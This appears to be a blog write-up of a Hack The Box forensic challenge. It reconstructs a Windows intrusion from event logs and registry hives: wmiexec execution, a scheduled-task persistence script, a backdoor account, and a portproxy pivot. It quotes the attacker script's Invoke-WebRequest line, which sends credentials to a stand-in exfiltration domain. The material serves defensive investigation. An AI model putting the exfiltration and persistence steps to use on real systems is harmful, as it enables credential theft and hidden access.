---
title: "The Enduring Echo Report - HTB Holmes"
date: 2025-09-26
retire_date: 2025-09-26
description: "Finding Persistence and Data Exfiltration Challenge"
tags:
  [
    "htb",
    "easy",
    "MITRE",
    "TTPs",
    "Incident Response",
    "IR",
    "DFIR",
    "IOCs",
    "Log Analysis",
    "enduring echo",
    "CTF","Persistence",
    "sandbox bypass"
  ]
difficulty: "Easy"
event: "HackTheBox"
---


**Scenario**: LeStrade passes a disk image artifacts to Watson. It's one of the identified breach points, now showing abnormal CPU activity and anomalies in process logs.
{{<newline>}}
> **Target host:** `HEISEN-9-WS-6`  
> **Image / evidence used:** Windows filesystem & exported event logs (Security.evtx, System.evtx, PowerShell.evtx), loaded registry hives (SYSTEM, SOFTWARE, SAM, NTUSER.DAT).  
> **Analyst:** Sneh Bavarva aka myst1c_m1do

There are many things happening in this task other than just questions asked. There are many other reg queries and bunch of different connections. But in this write-up/report it's not included.

{{<seperator>}}

## Executive summary

On 2025-08-24 an attacker established persistence via a scheduled task called **SysHelper Update**, which executed `C:\Users\Werni\Appdata\Local\JM.ps1`. The script created a privileged local account, generated a time-based password, exfiltrated the new credentials to `NapoleonsBlackPearl.htb`, and persisted a port proxy that forwarded an external listener to an internal SSH host. The chain of evidence is supported by the Task XML, the JM.ps1 script, Security Event ID 4720 (user creation), and the SYSTEM hive PortProxy entries.

{{<seperator>}}

### Report in PDF

{{< pdf src="/images/enduring-echo.pdf" height="900" >}}

### Table of contents

1. What was the first (non cd) command executed by the attacker on the host?
2. Which parent process (full path) spawned the attacker’s commands?
3. Which remote-execution tool was most likely used for the attack?
4. What was the attacker’s IP address?
5. What is the first element in the attacker’s sequence of persistence mechanisms?
6. Identify the script executed by the persistence mechanism.
7. What local account did the attacker create?
8. What domain name did the attacker use for credential exfiltration?
9. What password did the attacker’s script generate for the newly created user?
10. What was the IP address of the internal system the attacker pivoted to?
11. Which TCP port on the victim was forwarded to enable the pivot?
12. What is the full registry path that stores persistent IPv4→IPv4 TCP listener-to-target mappings?
13. What is the MITRE ATT&CK ID associated with the previous technique used by the attacker to pivot to the internal system?
14. Before the attack, the administrator configured Windows to capture command line details in the event logs. What command did they run to achieve this?

{{<seperator>}}

### 1. What was the first (non cd) command executed by the attacker on the host? (string)

**Answer (short):**  
```cmd
systeminfo
```
{{<newline>}}
**mindset:**

Answer will be in the `C\Windows\System32\winevt\logs\Security.evtx` file because Windows logs all process creation events (Event ID 4688) there under the Detailed Tracking audit policy. With command-line auditing enabled, this is the source of truth for reconstructing exactly what processes and with what arguments were executed on the host.

I opened the Security hive and filtered for 4688 event and used Find with Werni and I saw bunch of things like it was connecting to different domain, doing ssh, many reg queries and etc.

Then I found this event with `systeminfo` command

I know this is the long method but it gave me gist of the overall things are happening and I found accountname (Werni) with seeing different logs in the same hive.

{{< figure src="/images/ctf/htb/sherlock/20250923170952.png" alt="campaign" caption=" " align="center" >}}

{{<seperator>}}

### 2. Which parent process (full path) spawned the attacker’s commands? (C:\FOLDER\PATH\FILE.ext)

**Answer (short):**  
```cmd
C:\Windows\System32\wbem\WmiPrvSE.exe
```
{{<newline>}}
We just have to look at the parent process in that event

{{< figure src="/images/ctf/htb/sherlock/20250923171930.png" alt="campaign" caption=" " align="center" >}}

{{<seperator>}}

### 3. Which remote-execution tool was most likely used for the attack? (filename.ext)

**Answer (short):**  
```cmd
wmiexec.py
```
{{<newline>}}
**mindset:**
{{<newline>}}
With EvtxECmd.exe tool to parse the event logs and check for Windows Security Event ID 4688. Why 4688? Because this event allows us to observe the Process Command Line information.

```powershell
EvtxECmd.exe -d "The_Enduring_Echo\The_Enduring_Echo\C\Windows\System32\winevt\logs" --csv . --csvf evtx.csv
```
{{<newline>}}
We viewed the parsed CSV file using Timeline Explorer, then filtered for Event ID 4688 and searched for "cmd" in the search box. We observed a remote execution process where WmiPrvSE.exe spawned cmd.exe to execute remote commands. The first command was "cd", followed by "systeminfo". Based on this activity, we conclude that the attacker was using the wmiexec.py tool for remote execution

{{<seperator>}}

### 4. What was the attacker’s IP address? (IPv4)

**Answer (short):**  
```cmd
10.129.242.110
```
{{<newline>}}
**mindset:**
{{<newline>}}
I left this question as I couldn't able to figure out this so when we get answer for Q.8, I thought about this and since there's a domain, there should be some connectivity in between to thain and IP address. This was my thought, which is not the correct way to find the answer.

But luckily, I Find for the domain `NapoleonsBlackPearl.htb` in the Security hive and I can see the IP address there! Which is, of course, Attacker's IP

**Where to search / evidence to gather:**

{{< figure src="/images/ctf/htb/sherlock/20250923172842.png" alt="campaign" caption=" " align="center" >}}

{{<seperator>}}

### 5. What is the first element in the attacker’s sequence of persistence mechanisms? (string)

**Answer (short):**  
```cmd
Scheduled Task: SysHelper Update
```
{{<newline>}}
**mindset:**
{{<newline>}}
Persistence is most commonly established with the scheduled tasks hence, here we have to look after scheduled tasks. Now, I don't remember the exact path for the scheduled tasks so i just did the simple google search

{{< figure src="/images/ctf/htb/sherlock/20250923115701.png" alt="campaign" caption=" " align="center" >}}

and we have bunch of information. So, I checked in the C:\Windows\System32\Tasks folder and I can see a suspicious task named as `SysHelper Update`

Since we have lots of data and every registry hives, we can verify it manually as well just like we saw in google search and in the stackoverflow.
https://stackoverflow.com/questions/2913816/how-to-find-the-location-of-the-scheduled-tasks-folder

**Evidence / locations:**

- Registry TaskCache: `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\SysHelper Update` (LastWrite matches attack timeframe)

- Task XML on disk: `C:\Windows\System32\Tasks\SysHelper Update` (shows the script)

inspecting registry TaskCache entries in loaded SOFTWARE hive with Registry Explorer

**Why it’s the first:**  
Task registration LastWrite and the script execution events occur before other persistence artifacts (Run keys, services, etc.), making it the earliest persistence element.

{{< figure src="/images/ctf/htb/sherlock/20250923160912.png" alt="campaign" caption=" " align="center" >}}

{{< figure src="/images/ctf/htb/sherlock/20250923160936.png" alt="campaign" caption=" " align="center" >}}

we can see ID on the right side and now if we go to `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{ID}` we can see the majority of the details

{{< figure src="/images/ctf/htb/sherlock/20250923161119.png" alt="campaign" caption=" " align="center" >}}

{{<seperator>}}

### 6. Identify the script executed by the persistence mechanism. (C:\FOLDER\PATH\FILE.ext)

**Answer (short):**  
```cmd
C:\Users\Werni\Appdata\Local\JM.ps1
```
{{<newline>}}
Since it's a file, we can open it with the editor and look the content inside of it. I opened with notepad and I can see the script location

**Evidence / locations:**

- On disk: `C:\Users\Werni\Appdata\Local\JM.ps1` (file contents)

{{< figure src="/images/ctf/htb/sherlock/20250923161352.png" alt="campaign" caption=" " align="center" >}}

{{<seperator>}}

### 7. What local account did the attacker create? (string)

**Answer (short):**  
```cmd
svc_netupd
```
{{<newline>}}
**mindset:**
{{<newline>}}
I just searched for "new account creation event id" and it's 4720. All we have to do is, go to the Security.evtx file and filter for the 4720 event. There's only 5 events and only one events was occurred on the date of this task. We can clearly see the account name for that event

**Evidence / locations:**

- Security.evtx Event ID **4720** (A user account was created): `TargetUserName = svc_netupd`

- SAM hive: `HKLM\SAM\Domains\Account\Users\` → new RID (another place where we can find the answer)
- ProfileList entry: `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\<SID>\ProfileImagePath = C:\Users\svc_netupd` (if profile created it could be here, but it's not the case in our files, which is strange) 

**Why we are confident:**  
Event 4720 explicitly records account creation with the username `svc_netupd`.

{{< figure src="/images/ctf/htb/sherlock/20250923162101.png" alt="campaign" caption=" " align="center" >}}

{{< figure src="/images/ctf/htb/sherlock/20250923162041.png" alt="campaign" caption=" " align="center" >}}

{{<seperator>}}

### 8. What domain name did the attacker use for credential exfiltration? (domain)

**Answer (short):**  
```cmd
NapoleonsBlackPearl.htb
```
{{<newline>}}
We simply have to open that JM.ps1 file and we can clearly see this domain in that

**Evidence / locations:**

- JM.ps1 script: `Invoke-WebRequest -Uri "http://NapoleonsBlackPearl.htb/Exchange?data=...` (clear text)

{{< figure src="/images/ctf/htb/sherlock/20250923162254.png" alt="campaign" caption=" " align="center" >}}

{{<seperator>}}

### 9. What password did the attacker’s script generate for the newly created user? (string)

**Answer (short):**  
`Watson_20250824160509` _(derived from host local time when account was created; format `Watson_yyyyMMddHHmmss` - event 4720 time converted to UTC-7)_

**Evidence / locations / method:**

- Script defines: `$password = "Watson_$timestamp"` where `$timestamp = (Get-Date).ToString("yyyyMMddHHmmss")`.

- Event 4720 (`TimeCreated=2025-08-24T23:05:09Z`) → host local (UTC−7) = `2025-08-24 16:05:09` → timestamp `20250824160509`.

we can use the same event of 4720 since it was account creation time and password is generating all together which we know from reading the JM.ps1 script and we just have to -7 hours to get the UTC format

{{< figure src="/images/ctf/htb/sherlock/20250923162551.png" alt="campaign" caption=" " align="center" >}}

{{<seperator>}}

### 10. What was the IP address of the internal system the attacker pivoted to? (IPv4 address)

**Answer (short):**  
```cmd
192.168.1.101
```
{{<newline>}}
**mindset:**
{{<newline>}}
So next 4 questions are like same category if we read them. This question is asking for which IP attacker was pivoted to, next asks for attacked connected on which port and third is asking for the hive path where this connection gets stored. So logically thinking, we can find this and next question answer if we find answer of third question.

I just searched third question on google and it gave me answer and link for the proof!
https://gist.github.com/scottmwyant/06853dbfa4e4728b24352e33555da335

{{< figure src="/images/ctf/htb/sherlock/20250923163152.png" alt="campaign" caption=" " align="center" >}}

I just navigate to that path and found where it was pivoted to.

{{< figure src="/images/ctf/htb/sherlock/20250923163320.png" alt="campaign" caption=" " align="center" >}}

**Evidence / locations:**

- SYSTEM hive portproxy value data shows `192.168.1.101:22` (value data under `HKLM\SYSTEM\ControlSet00X\Services\PortProxy\v4tov4\tcp\0.0.0.0:9999`).

{{<seperator>}}

### 11. Which TCP port on the victim was forwarded to enable the pivot? (port 0-65565)

**Answer (short):**  
```cmd
9999
```
{{<newline>}}
We can see this in the previous question's answer

{{<seperator>}}


### 12. What is the full registry path that stores persistent IPv4→IPv4 TCP listener-to-target mappings? (HKLM......)

**Answer (short):**  
```cmd
HKLM\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4\tcp
```
{{<newline>}}
Again same, we can see in the previous question's answer

{{<seperator>}}

### 13. What is the MITRE ATT&CK ID associated with the previous technique used by the attacker to pivot to the internal system? (Txxxx.xxx)

**Answer (short):**  
`T1090.001` — _Internal Proxy_ (subtechnique of Proxy T1090).

**mindset:**
{{<newline>}}
We can use google but we have GPT so why? I just gave a prompt to GPT and it gave me

https://attack.mitre.org/techniques/T1090/001/?utm_source=chatgpt.com

{{< figure src="/images/ctf/htb/sherlock/20250923163744.png" alt="campaign" caption=" " align="center" >}}

**Why:**  
Persistent port proxying on the compromised host to forward traffic to an internal host is an internal proxy technique.

{{<seperator>}}

### 14. Before the attack, the administrator configured Windows to capture command line details in the event logs. What command did they run to achieve this? (command)

**Answer (short):**

```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f
```
{{<newline>}}
Again just another prompt to GPT and we get the answer and verification steps too

{{< figure src="/images/ctf/htb/sherlock/20250923164056.png" alt="campaign" caption=" " align="center" >}}

**How to verify (commands):**

```powershell
# offline: inspect SOFTWARE hive in Registry Explorer at:
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit

# also verify Process Creation auditing is enabled:
auditpol /get /subcategory:"Process Creation"
```

**Evidence:**

- registry value `ProcessCreationIncludeCmdLine_Enabled = 0x1`

{{< figure src="/images/ctf/htb/sherlock/20250923164207.png" alt="campaign" caption=" " align="center" >}}

{{<seperator>}}

## Timeline

- **2025-08-24 16:03:50 (host local)** — Scheduled task `SysHelper Update` registered. (Task XML RegistrationInfo)

- **2025-08-24 16:05:09 (host local)** — PowerShell executed `JM.ps1`; `svc_netupd` account created (Security 4720).

- **Shortly after** — Script exfiltrated `svc_netupd|Watson_20250824160509` to `http://NapoleonsBlackPearl.htb/Exchange?data=<base64>`.

- **Pivot persisted** — PortProxy mapping `0.0.0.0:9999` → `192.168.1.101:22` stored in SYSTEM hive.

{{<seperator>}}

## IOCs

- Scheduled task: `SysHelper Update`
- Task XML path: `C:\Windows\System32\Tasks\SysHelper Update`
- Script path: `C:\Users\Werni\Appdata\Local\JM.ps1`
- Attacker user created: `svc_netupd`
- Generated password pattern: `Watson_yyyyMMddHHmmss` (example: `Watson_20250824160509`)
- Exfil domain: `NapoleonsBlackPearl.htb`
- PortProxy mapping (victim→target): `0.0.0.0:9999` → `192.168.1.101:22`
- Registry path: `HKLM\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4\tcp`
- Security events: 4720 (User Created), 4688 (Process Creation).
- MITRE: `T1090.001` (Internal Proxy), scheduled task persistence = T1053.

## What's next and connect?

Few more [sherlock writeups](/ctf/htb/sherlocks/) by me and [HTB CDSA](/blog/cdsa/) exam blog! Feel free to check it out and below are couple of ways to conect me!

🔗 [Contact Me](/contact)

📅 [Schedule via Calendly](https://calendly.com/bavarvasneh/30min)
{{<seperator>}}
